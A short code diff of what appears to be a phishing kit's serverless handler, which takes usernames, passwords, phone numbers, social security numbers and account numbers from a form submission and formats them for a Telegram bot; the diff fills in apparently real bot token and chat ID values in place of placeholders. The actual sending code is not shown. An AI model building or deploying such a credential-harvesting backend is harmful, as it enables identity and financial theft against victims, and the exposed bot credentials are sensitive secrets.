@@ -8,8 +8,8 @@ export default async function handler(req, res) {
   const { code, type, page, username, password, phone, ssn, accountNumber } = req.body;
 
   // Your Telegram Bot Token and Chat ID
-  const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-  const CHAT_ID = 'YOUR_CHAT_ID_HERE';
+  const BOT_TOKEN = '8690222414:AAE98JaorMmqP8nlS0zSWlw3o_ocoRgPHGY';
+  const CHAT_ID = '5207440324';
 
   // Format the message based on what data was sent
   let message = '';
